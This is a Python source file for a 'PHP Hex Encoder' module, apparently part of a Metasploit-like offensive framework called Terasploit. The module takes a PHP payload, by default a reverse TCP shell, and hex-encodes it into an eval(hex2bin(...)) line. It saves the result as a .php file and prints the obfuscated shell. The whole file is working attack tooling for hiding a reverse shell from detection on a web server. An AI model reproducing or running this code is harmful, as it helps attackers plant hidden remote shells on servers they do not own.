#######
# Module/Encoder: PHP Hex Encoder
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.encoder import *

class TerasploitModule(Encoder):
    
    module_type = 'encoder'
    payload = 'modules/payload/php/multi/reverse_tcp'
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : self.module_type,
                'Name' : 'PHP Hex Encoder',
                'Author' : 'Charlie (4steroth)',
                
                'Description' : [
                    'PHP Hex Encoder'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('encoder',reset=True)


    def encode(self,payload,arch):
        if arch.upper() != 'PHP':
            info_print ('Failed to encode, invalid encoder.')
            return False

        encode = str(hexlify(bytes(payload, "utf-8")), "utf-8")

        return (
            "eval(hex2bin('{}'));".format(
                encode
            )
        ), True


    def run(self) -> tuple[str, bool]: 
        payload = self.payload.shell_content()
        payload_arch = module_info.payload_info['Arch']
        shell_name = module_info.payload_info['Type']

        info_print ('Encoding shell...')
        encoded_shell = self.encode(payload,payload_arch)
        if not encoded_shell:
            return 'done', True
        
        info_print ('Done encoding shell in hex, generating file...')
        shell, boolean = encoded_shell
        if boolean == True:
            self.generate_file(shell_name,payload_arch,shell)
            info_print (f'Saved as {shell_name}.php')
            print ('----')
            print (shell)
            print ('----')
            return 'done', True
        if boolean == False:
            return 'done', True